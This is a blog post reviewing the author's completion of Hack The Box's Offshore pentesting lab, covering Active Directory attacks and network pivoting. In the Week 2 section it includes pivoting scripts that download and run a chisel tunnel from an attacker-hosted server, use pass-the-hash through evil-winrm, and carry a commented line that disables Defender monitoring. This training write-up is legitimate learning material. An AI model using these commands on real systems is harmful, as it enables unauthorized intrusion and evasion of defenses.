---
title: Offshore Review
layout: single
categories: [blog]
permalink: /:categories/:year/:month/:day/:title/
classes: wide
toc: true
show_date: true
excerpt: "My journey through HTB's Offshore Pro Lab!"
---

# Intro

December was gonna be another month of lockdown at home without much to do, so after a friend pwned it, and some nice troll from the InfoSec Prep discord started it, I decided to follow suit and to dedicate the month to [Offshore](https://www.hackthebox.eu/home/labs/pro/view/2)! Unfortunately I was a bit impatient, bought the lab access on the 1st of December at midnight, turned out that they had a 50% discount from the 1st of December, which was rolled out during the day, so missed that 😅

# Getting up to speed with Active Directory

I had dedicated the last 2 weeks of November to get up to speed with Active Directory and the attacks on it, I used [Attacking and Defending Directory](https://www.pentesteracademy.com/course?id=47) from PentesterAcademy (which is what comes bundled up with CRTP), the AD section of Heath Adam's Practical Ethical Hacking Udemy [course](https://www.udemy.com/course/practical-ethical-hacking/), and various blog posts about specific attacks I found after googling around a bit. Overall it was very much needed, as my first and last interaction with AD was with the HTB Forest box, which I had done while it was active, but with way too many hints, and without understanding what I was doing. Putting words in my head behind how Kerberos works, what kerberoasting or asreproasting is, how to get golden/silver ticket, etc helped a lot understanding the basics.

I even made my own little AD lab first on Azure, then at home, to follow along some attacks on Heath Adams' course and to experiment a bit. Some resources for that [here](https://csenox.github.io/active-directory/2020/10/07/AD-Lab/), [here](https://medium.com/@vartaisecurity/lab-building-guide-virtual-active-directory-5f0d0c8eb907), [here](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f), [here](https://medium.com/swlh/building-an-active-directory-lab-part-1a-automatedlab-fc2399ebe5be), [here](https://social.technet.microsoft.com/wiki/contents/articles/36438.windows-server-2016-build-a-windows-domain-lab-at-home-for-free.aspx), and [here](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/).

I decided to take the opportunity to learn some new tools, so I set up [Obsidian](https://obsidian.md/) for note taking, and [Covenant](https://github.com/cobbr/Covenant) as a C2. Spoiler, I ended up using more often metasploit than covenant as a C2 haha! Also set up a [Commando VM](https://github.com/fireeye/commando-vm) that could access my covenant server running on my Parrot machine, ended up doing everything from Parrot...

# Week 1: Baby steps

Armed with my new found AD knowledge, I started Offshore... and didn't see any AD attacks for a while 😅 There was some web attacks, a first pivot using SSH, some looking around making lots of noise (a blue teamer in charge of the offshore domains would have been able to run circles around me :P). But making friends along the way especially in the HTB discord server, we got together for some challenges, and I was at 25% at the end of my first week, on track to finish by Christmas!

# Week 2: Pivoting...

The first domain owned, started the pivoting game, and the AD attacks. It took me a few hours to find the best solutions for pivoting through the domains, using this [post](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/) which was very thorough in the many ways a red teamer can pivot through a network, and tired of having to type commands over and over, I decided to script my pivoting, and here's the result: (spoiler free and re-usable)

+ `pivot2.sh` to serve chisel64.exe, pipe the powershell script to evil-winrm, and set the proxychains config for this DC:

```bash
#!/bin/bash

if [ $# -ne 1 ]; then
    echo '-s[tart]/-r[un]'
    exit
fi

sudo sed -i 's/127\.0\.0\.1 108./127\.0\.0\.1 1080/' /etc/proxychains.conf

if [[ $1 = '-s' ]]; then
    echo '[+] Serving on port 8000...'
    python3 -m http.server 8000 > /dev/null 2>&1 &
    cat pivot2_s.ps1 | evil-winrm -u administrator -H YOUTHOUGHTYOUDSEEAHASHDIDNTYOU -i 172.16.X.X
else
    cat pivot2_r.ps1 | evil-winrm -u administrator -H YOUTHOUGHTYOUDSEEAHASHDIDNTYOU -i 172.16.X.X
fi
```

+ `pivot2_s.ps1` to upload and run the chisel client on the DC:

```powershell
# Set-MpPreference -DisableRealtimeMonitoring $true
cd ../appdata/local/temp
curl -outf chisel.exe http://10.10.14.XX:8000/chisel64.exe
./chisel client 10.10.14.XX:12345 R:1080:socks
```

+ `pivot2_r.ps1` to run the chisel client if it's already uploaded:

```powershell
# Set-MpPreference -DisableRealtimeMonitoring $true
cd ../appdata/local/temp
./chisel client 10.10.14.XX:12345 R:1080:socks
```

+ `pivot3.sh` to kill the HTTP server, launch the chisel server, and change the proxychains config for the new pivot:

```bash
#!/bin/bash

ps -aux | grep http.server | grep 8000 | grep -P '\d+' -o | head -1 | xargs kill 2>&1 > /dev/null
sudo sed -i 's/127\.0\.0\.1 108./127\.0\.0\.1 1081/' /etc/proxychains.conf
chisel server -p 12345 -reverse
```

You're welcome to steal those short scripts and adapt them for your pivoting needs! As I would get to know, I'd need a few of those to pivot through all the domains, in total 4 pivots!

# Week 3: AD Attacks are yummy

Cross domain and cross forest attacks were kinda new to me but I had a blast learning them! Also, ACLs can hide many juicy things :P Bloodhound was a lot of help in finding out how to abuse some ACLs and trusts, I wish I had used [PowerView](https://exploit.ph/powerview.html) more though and enumerated some stuff manually, would have prevented a lot of VM lagging and crashes because well I had obsidian, covenant, discord, and bloodhound running at the same time... But still learned a lot along the way, and the 3rd week was the 3rd quarter syndrome a bit, seeing how much work I had done, and seeing I had about the same amount still to do, and Christmas approaches...

# Week 4: Flag hunt

Total domain pwnage! I had owned all offshore domains... and was still missing a few flags. So on the enumeration hunt I went, trying to find some hidden flags, and turns out one of those was actually from a challenge that had been removed! Thanks to Ippsec for the help taking care of that!

24th of December, 3 PM, all domain flags in the pocket, getting ready for Christmas cooking... and still lacking one linux machine! This one turned up to be a bit of a closed beast, but was a very nice programming challenge, and I enjoyed writing the script to get the privesc on it, but that was on the 25th. So in the end Offshore completed, just on Christmas day :D And a nice certificate as a gift!

![Offshore Certificate]({{site.url}}/blog/assets/images/offshore-certificate.png)

# Review

Overall I learned during my Offshore journey, some challenges were frustrating, some required a bit of help, I won't hide it, I made good friends along the way, and I'm very happy I could finish it under a month. I would recommend Offshore to all pentesters/hackers who want some more hands-on experience with AD attacks, and pivoting through networks, and who are not shy of googling stuff until it works. Very long but very good experience, looking forward to doing more AD related stuff in the future!
